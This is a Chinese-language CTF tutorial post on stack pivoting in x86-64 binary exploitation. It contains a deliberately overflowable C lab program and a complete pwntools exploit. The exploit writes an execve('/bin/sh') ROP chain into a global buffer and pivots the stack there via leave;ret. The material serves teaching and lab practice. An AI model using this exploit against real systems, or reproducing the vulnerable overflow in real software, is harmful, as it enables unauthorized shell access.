---
title: "Day18－Stack Pivoting"
date: 2024-09-18
draft: false
tags: ["iron-man-2024", "pwn", "binary-exploitation"]
categories: ["security-research"]
author: "YJK"
showToc: true
TocOpen: false
---


## [Lab 網址](https://github.com/YJK0805/PWN-CTF-note/)

## 前言

如果我們沒有辦法有足夠的長度或方法 leak libc 或是構建 ROP chain，還有什麼攻擊方式嗎？其實有的，就是將 stack 直接移到其他區塊並執行事先寫在指定區域的 chain。將 stack 遷移到其他地方的方式就叫做 Stack Pivoting 或 Stack Migration。

## Stack Pivoting

Stack Pivoting 是將 ROP chain 分次寫在指定區域，最後將 stack 遷移過去執行。Stack 由 `rsp` 控制，因此我們需要控制 `rsp`，主要利用以下的關鍵指令：

- leave ; ret

實際執行了以下兩個動作：

- leave -> mov rsp , rbp ; pop rbp ;
- ret -> pop rip;

由於在每次的 buffer overflow 中，`rbp` 是可以控制的，所以我們可以利用 `rbp` 加上這個指令來控制 `rsp`。這些 gadgets 在程式中幾乎都可以找到，因為它們通常用於 function 結束時恢復上一個 function 的 stack frame。

### 範例

以下範例展示如何將 `rsp` 遷移到另一個區塊：

原本的 `rbp` 是 `0x7ffe65dea290`，`rsp` 是 `0x7ffe65dea280`。經過 `leave` 後，`rbp` 被換成我們填入的 `save rbp` 位置，`rsp` 變為 `rbp + 0x8`。再透過一次 `leave`，`rsp` 就會進一步改變。

如此一來，我們就可以控制執行流程，並且可以通過不斷遷移 stack 來達成任意的 ROP。

![image](/images/iron2024/day18_image1.png)

![image](/images/iron2024/day18_image2.png)

![image](/images/iron2024/day18_image3.png)

![image](/images/iron2024/day18_image4.png)

## Lab

查看以下原始碼：

```c
#include<stdio.h>
#include<stdlib.h>

char name[0x100];

int main(){
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    char message[0x10];
    puts("Welcome to challenge!");
    puts("What's your name?");
    read(0, name, 0x100);
    puts("Leave a message: ");
    read(0, message, 0x20);
    return 0;
}
```

使用以下指令進行編譯：

```bash
gcc src/stack_pivoting.c  -o ./stack_pivoting/share/stack_pivoting -fno-stack-protector -no-pie -static
```

## writeup

可以發現有一個全域變數 `name` 可以寫入內容，還有一個 `message` 可以輸入並且存在 buffer overflow 的風險。我們可以確認是否能覆蓋 return address。

在輸入是從 `rbp - 0x10` 輸入 0x20，因此可以 overflow 的空間為 0x20 - 0x10 = 0x10，剛好可以覆蓋 return address。

![image](/images/iron2024/day18_image5.png)

因為編譯參數使用了 `-static`，我們可以利用許多 gadgets 來進行 ROP。不能直接透過 return address 進行 ROP，但可以將 ROP chain 寫在 `name` 中，透過 stack pivoting 將程式流程轉移到 `name`，進而執行 ROP。

確認 `name` 的位置：

![image](/images/iron2024/day18_image6.png)

接下來可以參考[Day12－Basic ROP](https://ithelp.ithome.com.tw/articles/10358514)

要注意，name 要填入最後將 rsp 遷移過去會改的 padding，還有要注意 return address 的部分要填上 leave ; ret，並且加上原先就存在 main function 最後的 leave ; ret，即可改變 rsp

完整 exploit：

```python
from pwn import *

context.arch = 'amd64'

# r = process('../stack_pivoting/share/stack_pivoting')
r = remote('127.0.0.1', 10009)

rop = flat(
    0x00000000004048f4, # pop rsi ; ret
    0x49c230, # writable address
    0x0000000000417807, # pop rax ; ret
    b'/bin/sh\x00',
    0x0000000000418f31, # mov qword ptr [rsi], rax ; ret
    0x0000000000417807, # pop rax ; ret
    0x3b, # execve
    0x0000000000402008, # pop rdi ; ret
    0x49c230, # writable address
    0x00000000004048f4, # pop rsi ; ret
    0x0, # NULL
    0x00000000004563b7, # pop rdx ; pop rbx ; ret
    0x0, # NULL
    0x0, # NULL
    0x0000000000401291, # syscall
)
payload = b'A' * 0x8 + rop
r.sendlineafter(b"What's your name?\n",payload)
name = 0x000000000049db40
leave_ret = 0x0000000000401852
pivoting = b'A' * 0x10 + p64(name) + p64(leave_ret)
r.sendlineafter(b"Leave a message: \n",pivoting)
r.interactive()
```

solve!!!

![image](/images/iron2024/day18_image7.png)
